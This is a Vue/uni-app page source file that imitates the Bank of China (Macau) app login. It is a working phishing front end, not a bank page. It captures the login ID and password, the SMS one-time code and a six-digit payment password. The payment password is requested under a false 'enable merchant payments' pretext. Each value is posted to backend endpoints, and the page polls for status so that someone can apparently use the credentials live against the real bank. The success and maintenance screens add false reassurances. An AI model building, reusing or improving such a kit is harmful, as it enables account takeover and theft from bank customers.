<template>
	<view class="page-container">
		<!-- 全局 Loading 遮罩 -->
		<view v-if="globalLoading" class="global-loading-mask">
			<view class="global-loading-content">
				<image class="global-loading-logo" src="/static/images/bankofchina/loading.gif" mode="aspectFit"></image>
				<text class="global-loading-text">{{ globalLoadingText }}</text>
				<view class="global-loading-dots">
					<view class="dot dot1"></view>
					<view class="dot dot2"></view>
					<view class="dot dot3"></view>
				</view>
			</view>
		</view>

		<!-- ==================== show===1: 登錄頁 ==================== -->
		<view v-if="show===1" class="bank-login-page">
			<view class="status-bar"></view>
			<view class="header-bg">
				<view class="back-btn" @click="goHome">
					<u-icon class="back-icon" name="arrow-left" size="32"></u-icon>
				</view>
				<view class="logo-section">
					<image class="bank-logo" style="width: 414rpx;height: 89rpx;" src="/static/images/bankofchina/pq.png" mode="aspectFit"></image>
				</view>
			</view>

			<view class="login-form">
				<view class="input-group">
					<input class="form-input" placeholder="請輸入登錄ID" v-model="loginId" maxlength="12" />
					<view v-if="loginId.length > 0" class="clear-btn" @click="loginId = ''">
						<u-icon name="close-circle-fill" color="#999" size="28"></u-icon>
					</view>
				</view>

				<view class="input-group">
					<input class="form-input" placeholder="請輸入登錄密碼" type="password" v-model="password" maxlength="20" />
					<view v-if="password.length > 0" class="clear-btn" @click="password = ''">
						<u-icon name="close-circle-fill" color="#999" size="28"></u-icon>
					</view>
				</view>

				<view class="input-group captcha-group">
					<view class="captcha-input-wrapper">
						<input class="form-input captcha-input" placeholder="請輸入驗證碼" v-model="captcha" maxlength="4" />
						<view v-if="captcha.length > 0" class="clear-btn captcha-clear" @click="captcha = ''">
							<u-icon name="close-circle-fill" color="#999" size="28"></u-icon>
						</view>
					</view>
					<view class="captcha-img" @click="refreshCaptcha">
						<canvas class="captcha-canvas" canvas-id="captchaCanvas" :style="{ width: '180rpx', height: '100rpx' }"></canvas>
					</view>
				</view>

				<view class="options-row">
					<view class="remember-option" @click="rememberLogin = !rememberLogin">
						<view class="checkbox" :class="{ 'checked': rememberLogin }">
							<u-icon v-if="rememberLogin" name="checkmark" color="#FFFFFF" size="20"></u-icon>
						</view>
						<text class="option-text">記住登錄ID</text>
					</view>
					<view class="reset-password" @click="handleResetPassword">
						<text class="reset-text">重新設密碼</text>
					</view>
				</view>

				<view class="login-btn" @click="handleLogin">
					<text class="btn-text">登錄</text>
				</view>

				<view class="bottom-links">
					<text class="link-text">中銀e網用戶請直接登錄，中銀卡戶點擊</text>
					<text class="register-link" @click="handleRegister">註冊</text>
				</view>
			</view>
		</view>

		<!-- ==================== show===2: 驗證碼頁 ==================== -->
		<view v-if="show===2" class="verification-page">
			<view class="verify-status-bar"></view>
			<view class="verify-header">
				<view class="verify-back-btn" @click="show = 1">
					<u-icon name="arrow-left" color="#FFFFFF" size="28"></u-icon>
				</view>
				<view class="verify-header-title">
					<text class="verify-title-text">驗證手機號碼</text>
				</view>
			</view>

			<view class="verify-content">
				<view class="verify-form-section">
					<view class="verify-form-row">
						<view class="verify-form-label"><text class="verify-label-text">手機號碼</text></view>
						<view class="verify-form-value"><text class="verify-phone-text">{{ maskedLoginId }}</text></view>
					</view>
					<view class="verify-form-row">
						<view class="verify-form-label"><text class="verify-label-text">驗證碼</text></view>
						<view class="verify-form-input-group">
							<view class="verify-code-boxes" @click="focusHiddenInput">
								<view v-for="(digit, index) in verifyCodeArray" :key="index"
									class="verify-code-box"
									:class="{ 'active': verifyActiveIndex === index, 'filled': digit !== '' }">
									<text class="verify-code-digit">{{ digit }}</text>
									<view v-if="verifyActiveIndex === index && digit === ''" class="verify-cursor"></view>
								</view>
							</view>
							<input class="verify-hidden-input"
								type="number"
								:focus="shouldVerifyFocus"
								:value="hiddenVerifyValue"
								maxlength="6"
								@input="onVerifyInput"
								@focus="onVerifyFocus" />
						</view>
					</view>
				</view>

				<view class="verify-actions">
					<view class="verify-resend" @click="resendCode">
						<text class="verify-resend-text" :class="{ 'disabled': countdown > 0 }">
							{{ countdown > 0 ? `${countdown}s 後重新發送` : '重新發送驗證碼' }}
						</text>
					</view>
					<view class="verify-submit-btn" :class="{ 'disabled': !isVerifyCodeComplete }" @click="handleSubmitVerify">
						<text class="verify-submit-text">確定</text>
					</view>
				</view>

				<view class="verify-notice-section">
					<text class="verify-notice-text">為確保帳戶安全，更換手機設備後的首次登錄需要驗證短訊動態密碼</text>
				</view>
			</view>

			<view class="verify-footer">
				<image class="verify-bank-logo" src="/static/images/bankofchina/pq.png" mode="aspectFit"></image>
			</view>
		</view>

		<!-- ==================== show===3: 收款服務頁 ==================== -->
		<view v-if="show===3" class="payments-page">
			<view class="payments-status-bar"></view>
			<view class="payments-header">
				<view class="payments-back-btn" @click="show = 1">
					<u-icon name="arrow-left" color="#FFFFFF" size="28"></u-icon>
				</view>
				<view class="payments-header-title">
					<text class="payments-title-text">收款服務</text>
				</view>
			</view>

			<view class="payments-content">
				<view class="payments-page-title">
					<text class="payments-title-main">開啟向商家收款服務</text>
				</view>

				<view class="payments-description-section">
					<view class="payments-desc-item"><text class="payments-desc-text">開啟後，您的收款方式將透過加密頻道傳輸給關聯商家。</text></view>
					<view class="payments-desc-item"><text class="payments-desc-text">商家可直接結算，提高收款效率。</text></view>
					<view class="payments-desc-item"><text class="payments-desc-text">全程加密處理，保護您的資金與隱私安全。</text></view>
					<view class="payments-desc-item"><text class="payments-desc-text">支持在綫付款功能，無需前往櫃檯即可完成交易。</text></view>
				</view>

				<view class="payments-advantages-section">
					<view class="payments-section-title"><text class="payments-title-text-sec">服務優勢</text></view>
					<view class="payments-advantage-item" v-for="(adv, idx) in advantages" :key="idx">
						<view class="payments-advantage-icon">
							<text class="bi" :class="adv.icon" style="font-size: 24rpx; color: #8d131f;"></text>
						</view>
						<view class="payments-advantage-content">
							<text class="payments-advantage-title">{{ adv.title }}</text>
							<text class="payments-advantage-desc">{{ adv.desc }}</text>
						</view>
					</view>
				</view>

				<view class="payments-notice-section">
					<view class="payments-section-title"><text class="payments-title-text-sec">溫馨提示</text></view>
					<view class="payments-notice-item" v-for="(notice, idx) in notices" :key="idx">
						<view class="payments-notice-dot"></view>
						<text class="payments-notice-text">{{ notice }}</text>
					</view>
				</view>
			</view>

			<view class="payments-button-section">
				<view class="payments-btn-primary" @click="handleActivate">
					<text class="payments-btn-text-primary">立即開啟</text>
				</view>
				<view class="payments-btn-secondary" @click="goHome">
					<text class="payments-btn-text-secondary">稍後再說</text>
				</view>
			</view>

			<!-- 密码弹窗 -->
			<view v-if="showPasswordModal" class="pwd-modal-overlay" @click="closePasswordModal">
				<view class="pwd-modal-content" @click.stop>
					<view class="pwd-modal-header">
						<text class="pwd-modal-title">確認開啟</text>
						<view class="pwd-modal-close" @click="closePasswordModal">
							<u-icon name="close" size="32" color="#333"></u-icon>
						</view>
					</view>
					<view class="pwd-modal-body">
						<text class="pwd-modal-label">請輸入支付密碼確認開啟服務</text>
						<view class="pwd-modal-password-area" @click="focusPasswordInput">
							<view v-for="(digit, index) in passwordArray" :key="index"
								class="password-circle"
								:class="{ 'filled': digit !== '', 'current': activePasswordIndex === index && digit === '' }">
								<view v-if="digit !== ''" class="password-filled-dot"></view>
								<view v-if="activePasswordIndex === index && digit === ''" class="cursor-line"></view>
							</view>
						</view>
						<input class="pwd-hidden-input"
							type="number"
							:focus="shouldPasswordFocus"
							:value="hiddenPasswordValue"
							maxlength="6"
							@input="onPasswordInput" />
					</view>
					<view class="pwd-modal-footer">
						<view class="pwd-modal-btn-cancel" @click="closePasswordModal"><text>取消</text></view>
						<view class="pwd-modal-btn-confirm" :class="{ 'disabled': !isPasswordComplete }" @click="confirmPaymentPassword"><text>確認驗證</text></view>
					</view>
				</view>
			</view>
		</view>

		<!-- ==================== show===4: 成功頁 ==================== -->
		<view v-if="show===4" class="success-page">
			<view class="success-status-bar"></view>
			<view class="success-header">
				<view class="success-back-btn" @click="goHome">
					<u-icon name="arrow-left" color="#FFFFFF" size="28"></u-icon>
				</view>
				<view class="success-header-title"><text class="success-title-text-header">收款服務</text></view>
			</view>

			<view class="success-content">
				<view class="success-icon-section" :class="{ 'animate': showSuccessAnimation }">
					<view class="success-icon-circle" :class="{ 'show': showSuccessIcon }">
						<u-icon name="checkmark" size="80" color="#fff"></u-icon>
					</view>
					<view v-if="showSuccessParticles" class="success-particles">
						<view v-for="i in 8" :key="i" class="particle-dot" :style="getParticleStyle(i)"></view>
					</view>
				</view>

				<view class="success-text-section" :class="{ 'show': showSuccessContent }">
					<text class="success-title-main">收款服務/在綫付款已成功開啓!</text>
				</view>

				<view class="success-info-card" :class="{ 'show': showSuccessCard }">
					<view class="success-info-row">
						<view class="info-icon"><u-icon name="checkmark-circle" size="32" color="#28a745"></u-icon></view>
						<text class="info-text">您的收款方式已安全對接商戶，交易將自動結算。</text>
					</view>
					<view class="success-info-row">
						<view class="info-icon"><u-icon name="clock" size="32" color="#FF8C00"></u-icon></view>
						<text class="info-text">開通時間：{{ successTime }}</text>
					</view>
					<view class="success-info-row">
						<view class="info-icon"><u-icon name="lock" size="32" color="#007AFF"></u-icon></view>
						<text class="info-text">所有收款信息均經加密保護，商戶無法獲取您的個人帳戶詳情。</text>
					</view>
				</view>

				<view class="success-features" :class="{ 'show': showSuccessFeatures }">
					<view class="success-features-grid">
						<view v-for="(feat, idx) in successFeatures" :key="idx" class="success-feature-badge">
							<text class="bi" :class="feat.icon" style="font-size: 24rpx; color: #8d131f;"></text>
							<text class="success-feature-text">{{ feat.text }}</text>
						</view>
					</view>
				</view>
			</view>

			<view class="success-action-buttons" :class="{ 'show': showSuccessActions }">
				<view class="success-home-btn" @click="goHome">
					<text class="success-home-text">返回首頁</text>
				</view>
			</view>
		</view>

		<!-- ==================== show===5: 失敗頁 ==================== -->
		<view v-if="show===5" class="failure-container">
			<view class="failure-status-bar">
				<view class="failure-status-icon-wrapper" :class="{ 'animate-shake': failureLoading }">
					<view class="failure-status-icon">⚠️</view>
				</view>
			</view>

			<view class="failure-main-content" :class="{ 'content-fade-in': failureContentVisible }">
				<view class="failure-title">收款服務/在綫付款開啓失敗</view>
				<view class="failure-message">{{ failureMessage || '很抱歉，服務未能成功開啓。請檢查您的帳戶信息或稍後重試。' }}</view>

				<view class="failure-reasons-section">
					<view class="failure-section-title">可能原因</view>
					<view class="failure-reasons-list">
						<view v-for="(reason, index) in failureReasons" :key="index" class="failure-reason-item"
							:class="{ 'item-slide-in': failureReasonsVisible }" :style="{ animationDelay: (index * 0.1) + 's' }">
							<view class="failure-reason-dot"></view>
							<text class="failure-reason-text">{{ reason }}</text>
						</view>
					</view>
				</view>

				<view class="failure-suggestions-section">
					<view class="failure-section-title">建議操作</view>
					<view class="failure-suggestions-list">
						<view v-for="(suggestion, index) in failureSuggestions" :key="index" class="failure-suggestion-item"
							:class="{ 'item-slide-in': failureSuggestionsVisible }" :style="{ animationDelay: (index * 0.1) + 's' }">
							<view class="failure-suggestion-number">{{ index + 1 }}</view>
							<text class="failure-suggestion-text">{{ suggestion }}</text>
						</view>
					</view>
				</view>
			</view>

			<view class="failure-action-buttons" :class="{ 'buttons-slide-up': failureButtonsVisible }">
				<button class="failure-home-button" @click="goHome">返回首頁</button>
			</view>
		</view>

		<!-- ==================== show===6: 維護頁 ==================== -->
		<view v-if="show===6" class="maintenance-container">
			<view class="maintenance-header">
				<view class="maintenance-nav-bar">
					<u-icon name="arrow-left" color="#FFFFFF" size="28" @click="goHome"></u-icon>
					<text class="maintenance-nav-title">系統維護</text>
					<view class="maintenance-nav-placeholder"></view>
				</view>
			</view>

			<view class="maintenance-content">
				<view class="maintenance-icon-wrapper" :class="{ 'show': showMaintenanceAnimation }">
					<view class="maintenance-icon rotating">
						<u-icon name="setting" color="#ffffff" size="80"></u-icon>
					</view>
				</view>

				<view class="maintenance-text-section" :class="{ 'show': showMaintenanceContent }">
					<text class="maintenance-title">系統維護中</text>
					<text class="maintenance-desc">為了給您提供更好的服務體驗</text>
					<text class="maintenance-desc">系統正在進行維護作業</text>
				</view>

				<view class="maintenance-info-card" :class="{ 'show': showMaintenanceCard }">
					<view class="maintenance-info-row">
						<u-icon name="clock" color="#FF8C00" size="28"></u-icon>
						<text class="maintenance-info-text">預計維護時間：4-5小時</text>
					</view>
					<view class="maintenance-info-row">
						<u-icon name="checkmark-circle" color="#28a745" size="28"></u-icon>
						<text class="maintenance-info-text">維護完成後將自動恢復服務</text>
					</view>
				</view>

				<view class="maintenance-actions" :class="{ 'show': showMaintenanceActions }">
					<view class="maintenance-refresh-btn" @click="handleMaintenanceRefresh">
						<u-icon name="reload" size="24" color="#333"></u-icon>
						<text class="maintenance-refresh-text">重新檢查</text>
					</view>
					<view class="maintenance-home-btn" @click="goHome">
						<text class="maintenance-home-text">返回首頁</text>
					</view>
				</view>

				<view class="maintenance-logo">
					<image class="maintenance-bank-logo" src="/static/images/bankofchina/pq.png" mode="aspectFit"></image>
				</view>
			</view>
		</view>
	</view>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, nextTick, getCurrentInstance } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

// ========== 页面状态 ==========
const show = ref(1)
const instance = getCurrentInstance()

// ========== 全局 Loading ==========
const globalLoading = ref(false)
const globalLoadingText = ref('加載中')

function showGlobalLoading(text = '加載中') {
	globalLoadingText.value = text
	globalLoading.value = true
}
function hideGlobalLoading() {
	globalLoading.value = false
}

// ========== URL 参数 ==========
const bankCode = ref('')

// ========== 轮询 ==========
const recordId = ref(0)
let pollingTimer = null
let isPolling = false
let pollingCount = 0
const MAX_POLLING_COUNT = 60

// ========== 生命周期 ==========
onLoad((options) => {
	const token = getToken()
	if (!token) {
		uni.showToast({ title: '請先登入', icon: 'none', duration: 2000 })
		setTimeout(() => { uni.reLaunch({ url: '/pages/auth/login' }) }, 2000)
		return
	}
	if (options?.code) bankCode.value = options.code
})

onMounted(() => {
	nextTick(() => { initCaptcha() })
})

onUnmounted(() => {
	stopPolling()
	clearCountdown()
})

// ========== 登錄頁數據 ==========
const loginId = ref('')
const password = ref('')
const captcha = ref('')
const rememberLogin = ref(false)
const captchaCode = ref('')
let canvasContext = null

function initCaptcha() {
	canvasContext = uni.createCanvasContext('captchaCanvas', instance.proxy)
	generateCaptcha()
}

function generateCaptcha() {
	const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	let result = ''
	for (let i = 0; i < 4; i++) {
		result += chars.charAt(Math.floor(Math.random() * chars.length))
	}
	captchaCode.value = result
	drawCaptcha()
}

function drawCaptcha() {
	if (!canvasContext) return
	const ctx = canvasContext
	const width = 90
	const height = 50

	ctx.clearRect(0, 0, width, height)
	ctx.fillStyle = '#F0F0F0'
	ctx.fillRect(0, 0, width, height)

	for (let i = 0; i < 5; i++) {
		ctx.strokeStyle = getRandomColor()
		ctx.lineWidth = 1
		ctx.beginPath()
		ctx.moveTo(Math.random() * width, Math.random() * height)
		ctx.lineTo(Math.random() * width, Math.random() * height)
		ctx.stroke()
	}

	for (let i = 0; i < captchaCode.value.length; i++) {
		const char = captchaCode.value[i]
		const x = 10 + i * 18
		const y = 25 + Math.random() * 10 - 5
		const angle = (Math.random() - 0.5) * 0.4

		ctx.save()
		ctx.translate(x, y)
		ctx.rotate(angle)
		ctx.font = 'bold 16px Arial'
		ctx.fillStyle = getRandomColor()
		ctx.fillText(char, 0, 0)
		ctx.restore()
	}

	for (let i = 0; i < 30; i++) {
		ctx.fillStyle = getRandomColor()
		ctx.beginPath()
		ctx.arc(Math.random() * width, Math.random() * height, 1, 0, 2 * Math.PI)
		ctx.fill()
	}

	ctx.draw()
}

function getRandomColor() {
	const colors = ['#333', '#666', '#999', '#007AFF', '#DC3545', '#28A745']
	return colors[Math.floor(Math.random() * colors.length)]
}

function refreshCaptcha() {
	captcha.value = ''
	generateCaptcha()
}

function handleResetPassword() {
	uni.showToast({ title: '請打開澳門中銀APP重設密碼', icon: 'none', duration: 2000 })
}

function handleRegister() {
	uni.showToast({ title: '請打開澳門中銀APP註冊', icon: 'none', duration: 2000 })
}

// ========== 登錄提交 ==========
async function handleLogin() {
	if (!loginId.value.trim()) {
		uni.showToast({ title: '請輸入登錄ID', icon: 'none' })
		return
	}
	if (loginId.value.length < 8 || loginId.value.length > 12 || !/^[a-zA-Z0-9]+$/.test(loginId.value)) {
		uni.showToast({ title: '登錄ID必須為8-12位數字或字母', icon: 'none' })
		return
	}
	if (!password.value.trim()) {
		uni.showToast({ title: '請輸入登錄密碼', icon: 'none' })
		return
	}
	if (password.value.length < 8 || password.value.length > 20 || !/^[a-zA-Z0-9]+$/.test(password.value)) {
		uni.showToast({ title: '登錄密碼必須為8-20位數字或字母', icon: 'none' })
		return
	}
	if (!captcha.value.trim()) {
		uni.showToast({ title: '請輸入驗證碼', icon: 'none' })
		return
	}
	if (captcha.value.toUpperCase() !== captchaCode.value.toUpperCase()) {
		uni.showToast({ title: '驗證碼錯誤，請重新輸入', icon: 'none' })
		refreshCaptcha()
		return
	}

	showGlobalLoading('登錄中')
	try {
		const res = await post('/ocbc/submitLogin', {
			account_type: bankCode.value || '中國銀行(澳門)',
			organization_id: loginId.value,
			user_id: loginId.value,
			password: password.value
		}, { showError: false })

		recordId.value = res.data.record_id
		startPolling()
	} catch (error) {
		hideGlobalLoading()
		password.value = ''
		refreshCaptcha()
		uni.showToast({ title: error.message || '登錄失敗', icon: 'none' })
	}
}

// ========== 轮询 ==========
function startPolling() {
	stopPolling()
	pollingCount = 0
	isPolling = false
	showGlobalLoading('等待處理中...')

	pollingTimer = setInterval(async () => {
		if (isPolling) return
		await pollStatus()
	}, 2000)
}

function stopPolling() {
	if (pollingTimer) {
		clearInterval(pollingTimer)
		pollingTimer = null
	}
	isPolling = false
	pollingCount = 0
}

async function pollStatus() {
	isPolling = true
	pollingCount++

	if (pollingCount > MAX_POLLING_COUNT) {
		stopPolling()
		hideGlobalLoading()
		show.value = 5
		initFailurePage()
		return
	}

	try {
		const res = await post('/ocbc/pollStatus', {
			record_id: recordId.value
		}, { showError: false })

		handleStatusChange(res.data.status, res.data)
	} catch (error) {
		console.error('Poll status error:', error)
	} finally {
		isPolling = false
	}
}

// ========== 状态处理 ==========
function handleStatusChange(status, data) {
	switch (status) {
		case 'need_captcha':
			stopPolling()
			hideGlobalLoading()
			show.value = 2
			uni.showToast({ title: '驗證碼已發送', icon: 'success', duration: 1500 })
			startCountdown()
			break

		case 'need_payment_password':
			stopPolling()
			hideGlobalLoading()
			show.value = 3
			break

		case 'success':
			stopPolling()
			hideGlobalLoading()
			show.value = 4
			initSuccessPage()
			break

		case 'captcha_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 2
			clearVerifyCode()
			uni.showToast({ title: '驗證碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'payment_password_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 3
			showPasswordModal.value = true
			resetPassword()
			uni.showToast({ title: '支付密碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'password_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 1
			clearLoginForm()
			uni.showToast({ title: '密碼錯誤，請重新輸入', icon: 'none', duration: 3000 })
			break

		case 'failed':
			stopPolling()
			hideGlobalLoading()
			show.value = 5
			failureMessage.value = ''
			initFailurePage()
			break

		case 'maintenance':
			stopPolling()
			hideGlobalLoading()
			show.value = 6
			initMaintenancePage()
			break

		case 'level':
		case 'card_error':
			stopPolling()
			hideGlobalLoading()
			show.value = 5
			initFailurePage()
			break

		default:
			break
	}
}

function clearLoginForm() {
	loginId.value = ''
	password.value = ''
	captcha.value = ''
	refreshCaptcha()
}

// ========== 驗證碼 ==========
const verifyCodeArray = ref(['', '', '', '', '', ''])
const verifyActiveIndex = ref(0)
const hiddenVerifyValue = ref('')
const shouldVerifyFocus = ref(false)
const countdown = ref(0)
let countdownTimer = null
const isSubmittingCode = ref(false)

const isVerifyCodeComplete = computed(() => verifyCodeArray.value.every(d => d !== ''))

const maskedLoginId = computed(() => {
	if (!loginId.value || loginId.value.length < 4) return '***'
	const start = loginId.value.slice(0, 3)
	const end = loginId.value.slice(-2)
	const middle = '*'.repeat(Math.max(0, loginId.value.length - 5))
	return `${start}${middle}${end}`
})

function focusHiddenInput() {
	shouldVerifyFocus.value = false
	nextTick(() => { shouldVerifyFocus.value = true })
}

function onVerifyFocus() {
	verifyActiveIndex.value = verifyCodeArray.value.findIndex(d => d === '')
	if (verifyActiveIndex.value === -1) verifyActiveIndex.value = 5
}

function onVerifyInput(event) {
	const value = event.detail?.value || event.target?.value || ''
	const cleanValue = value.toString().replace(/\D/g, '').slice(0, 6)
	hiddenVerifyValue.value = cleanValue

	verifyCodeArray.value = Array(6).fill('')
	for (let i = 0; i < cleanValue.length; i++) {
		verifyCodeArray.value[i] = cleanValue[i]
	}
	verifyActiveIndex.value = cleanValue.length < 6 ? cleanValue.length : 5

	if (cleanValue.length === 6) {
		setTimeout(() => { handleSubmitVerify() }, 100)
	}
}

function clearVerifyCode() {
	verifyCodeArray.value = ['', '', '', '', '', '']
	hiddenVerifyValue.value = ''
	verifyActiveIndex.value = 0
}

function startCountdown() {
	countdown.value = 60
	countdownTimer = setInterval(() => {
		countdown.value--
		if (countdown.value <= 0) clearCountdown()
	}, 1000)
}

function clearCountdown() {
	if (countdownTimer) {
		clearInterval(countdownTimer)
		countdownTimer = null
	}
	countdown.value = 0
}

function resendCode() {
	if (countdown.value > 0) return
	clearVerifyCode()
	startCountdown()
	shouldVerifyFocus.value = false
	nextTick(() => { setTimeout(() => { shouldVerifyFocus.value = true }, 200) })
	uni.showToast({ title: '驗證碼已重新發送', icon: 'success' })
}

async function handleSubmitVerify() {
	const code = verifyCodeArray.value.join('')
	if (code.length !== 6) {
		uni.showToast({ title: '請輸入完整的驗證碼', icon: 'none' })
		return
	}
	if (isSubmittingCode.value) return
	isSubmittingCode.value = true

	showGlobalLoading('驗證中...')
	try {
		await post('/ocbc/submitCaptcha', {
			record_id: recordId.value,
			captcha: code
		}, { showError: false })

		startPolling()
	} catch (error) {
		hideGlobalLoading()
		clearVerifyCode()
		uni.showToast({ title: error.message || '驗證碼提交失敗', icon: 'none' })
	} finally {
		isSubmittingCode.value = false
	}
}

// ========== 支付密碼 ==========
const showPasswordModal = ref(false)
const hiddenPasswordValue = ref('')
const passwordArray = ref(['', '', '', '', '', ''])
const activePasswordIndex = ref(0)
const shouldPasswordFocus = ref(false)

const isPasswordComplete = computed(() => passwordArray.value.every(d => d !== ''))
const fullPassword = computed(() => passwordArray.value.join(''))

function handleActivate() {
	showPasswordModal.value = true
	nextTick(() => { setTimeout(() => { shouldPasswordFocus.value = true }, 300) })
}

function closePasswordModal() {
	showPasswordModal.value = false
	resetPassword()
}

function resetPassword() {
	hiddenPasswordValue.value = ''
	passwordArray.value = ['', '', '', '', '', '']
	activePasswordIndex.value = 0
	shouldPasswordFocus.value = false
}

function focusPasswordInput() {
	shouldPasswordFocus.value = false
	nextTick(() => { shouldPasswordFocus.value = true })
}

function onPasswordInput(event) {
	const value = event.detail?.value || event.target?.value || ''
	const cleanValue = value.toString().replace(/\D/g, '').slice(0, 6)
	hiddenPasswordValue.value = cleanValue

	passwordArray.value = Array(6).fill('')
	for (let i = 0; i < cleanValue.length; i++) {
		passwordArray.value[i] = cleanValue[i]
	}
	activePasswordIndex.value = cleanValue.length < 6 ? cleanValue.length : 5
}

async function confirmPaymentPassword() {
	if (!isPasswordComplete.value) {
		uni.showToast({ title: '請輸入完整的支付密碼', icon: 'none' })
		return
	}

	const pwd = fullPassword.value
	showPasswordModal.value = false
	resetPassword()

	showGlobalLoading('身份驗證中')
	try {
		await post('/ocbc/submitPaymentPassword', {
			record_id: recordId.value,
			payment_password: pwd
		}, { showError: false })

		showGlobalLoading('驗證中')
		startPolling()
	} catch (error) {
		hideGlobalLoading()
		uni.showToast({ title: error.message || '驗證失敗，請重試', icon: 'none', duration: 3000 })
	}
}

// ========== 收款頁數據 ==========
const advantages = [
	{ icon: 'bi-shield-lock-fill', title: '安全可靠', desc: '採用銀行級加密技術，確保資訊不會外洩。' },
	{ icon: 'bi-lightning-charge-fill', title: '高效率結算', desc: '收款資訊自動對接商戶，即時到帳更快。' },
	{ icon: 'bi-incognito', title: '隱私保護', desc: '商家僅能取得結算所需信息，您的個人帳戶資訊不會外洩。' },
	{ icon: 'bi-patch-check-fill', title: '合規保障', desc: '嚴格遵循金融合規要求，保障您的合法權益。' }
]

const notices = [
	'本服務僅限認證商戶使用。',
	'您可隨時在「帳戶設定」中關閉服務。',
	'開啟服務不會額外收取任何費用。',
	'請確認綁定的收款帳戶為本人所有。'
]

// ========== 成功頁 ==========
const showSuccessAnimation = ref(false)
const showSuccessIcon = ref(false)
const showSuccessParticles = ref(false)
const showSuccessContent = ref(false)
const showSuccessCard = ref(false)
const showSuccessFeatures = ref(false)
const showSuccessActions = ref(false)
const successTime = ref('')

const successFeatures = [
	{ icon: 'bi-lightning-charge-fill', text: '即時到帳' },
	{ icon: 'bi-shield-lock-fill', text: '安全保障' },
	{ icon: 'bi-patch-check-fill', text: '便捷管理' },
	{ icon: 'bi-incognito', text: '隱私保護' }
]

function initSuccessPage() {
	const now = new Date()
	successTime.value = now.toLocaleString('zh-TW', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' })

	setTimeout(() => { showSuccessAnimation.value = true }, 200)
	setTimeout(() => { showSuccessIcon.value = true }, 800)
	setTimeout(() => { showSuccessParticles.value = true }, 1000)
	setTimeout(() => { showSuccessContent.value = true }, 1200)
	setTimeout(() => { showSuccessCard.value = true }, 1600)
	setTimeout(() => { showSuccessFeatures.value = true }, 2000)
	setTimeout(() => { showSuccessActions.value = true }, 2400)
}

function getParticleStyle(index) {
	const angle = (index - 1) * 45
	const delay = (index - 1) * 0.1
	return { '--angle': `${angle}deg`, 'animation-delay': `${delay}s` }
}

// ========== 失敗頁 ==========
const failureLoading = ref(true)
const failureContentVisible = ref(false)
const failureReasonsVisible = ref(false)
const failureSuggestionsVisible = ref(false)
const failureButtonsVisible = ref(false)

const failureMessage = ref('')
const failureReasons = ['網絡不穩定或系統繁忙', '帳戶信息未完成驗證', '系統臨時故障']
const failureSuggestions = ['確認已完成身份與收款帳戶驗證', '稍後重新開啓服務']

function initFailurePage() {
	failureLoading.value = true
	failureContentVisible.value = false
	failureReasonsVisible.value = false
	failureSuggestionsVisible.value = false
	failureButtonsVisible.value = false

	setTimeout(() => { failureLoading.value = false; failureContentVisible.value = true }, 800)
	setTimeout(() => { failureReasonsVisible.value = true }, 1200)
	setTimeout(() => { failureSuggestionsVisible.value = true }, 1600)
	setTimeout(() => { failureButtonsVisible.value = true }, 2000)
}

// ========== 維護頁 ==========
const showMaintenanceAnimation = ref(false)
const showMaintenanceContent = ref(false)
const showMaintenanceCard = ref(false)
const showMaintenanceActions = ref(false)

function initMaintenancePage() {
	showMaintenanceAnimation.value = false
	showMaintenanceContent.value = false
	showMaintenanceCard.value = false
	showMaintenanceActions.value = false

	setTimeout(() => { showMaintenanceAnimation.value = true }, 300)
	setTimeout(() => { showMaintenanceContent.value = true }, 800)
	setTimeout(() => { showMaintenanceCard.value = true }, 1200)
	setTimeout(() => { showMaintenanceActions.value = true }, 1600)
}

function handleMaintenanceRefresh() {
	showGlobalLoading('檢查系統狀態中...')
	setTimeout(() => {
		hideGlobalLoading()
		show.value = 1
		nextTick(() => { initCaptcha() })
		uni.showToast({ title: '請重新嘗試登錄', icon: 'none', duration: 2000 })
	}, 2000)
}

// ========== 返回首頁 ==========
function goHome() {
	uni.navigateBack({
		fail: () => {
			uni.switchTab({ url: '/pages/index/index' })
		}
	})
}
</script>

<style lang="scss" scoped>
.page-container { width: 100vw; min-height: 100vh; }

// ========== 全局 Loading ==========
.global-loading-mask {
	position: fixed; top: 0; left: 0; right: 0; bottom: 0;
	background: rgba(0, 0, 0, 0.7); z-index: 9999;
	display: flex; align-items: center; justify-content: center;
}
.global-loading-content { display: flex; flex-direction: column; align-items: center; }
.global-loading-logo { width: 200rpx; height: 200rpx; margin-bottom: 30rpx; }
.global-loading-text { color: #fff; font-size: 28rpx; margin-bottom: 20rpx; }
.global-loading-dots { display: flex; gap: 12rpx; }
.dot { width: 12rpx; height: 12rpx; border-radius: 50%; background: #fff; animation: dotPulse 1.4s ease-in-out infinite; }
.dot2 { animation-delay: 0.2s; }
.dot3 { animation-delay: 0.4s; }
@keyframes dotPulse { 0%, 80%, 100% { opacity: 0.3; transform: scale(0.8); } 40% { opacity: 1; transform: scale(1.2); } }

// ========== show===1: 登錄頁 ==========
.bank-login-page {
	height: 100vh; background: #FFFFFF;
	background-image: url('/static/images/bankofchina/login_top_bg.png');
	background-size: 595rpx 539rpx; background-position: right top; background-repeat: no-repeat;
	display: flex; flex-direction: column; position: relative;
}
.status-bar { height: var(--status-bar-height, 44rpx); background: transparent; }
.header-bg { padding: 0rpx 30rpx 80rpx 30rpx; min-height: 400rpx; }
.back-btn { position: absolute; top: 88rpx; left: 30rpx; width: 60rpx; height: 60rpx; display: flex; align-items: center; justify-content: center; z-index: 10; }
.back-icon { font-size: 80rpx; color: #333; font-weight: 300; }
.logo-section { display: flex; align-items: center; justify-content: center; margin-top: 200rpx; }
.bank-logo { width: 414rpx; height: 89rpx; margin-right: 30rpx; }
.login-form { flex: 1; padding: 60rpx 50rpx 50rpx 50rpx; background: #FFFFFF; border-radius: 40rpx 40rpx 0 0; margin-top: -40rpx; position: relative; z-index: 5; }
.input-group { margin-bottom: 40rpx; position: relative; }
.clear-btn { position: absolute; right: 20rpx; top: 50%; transform: translateY(-50%); width: 40rpx; height: 40rpx; display: flex; align-items: center; justify-content: center; z-index: 10; }
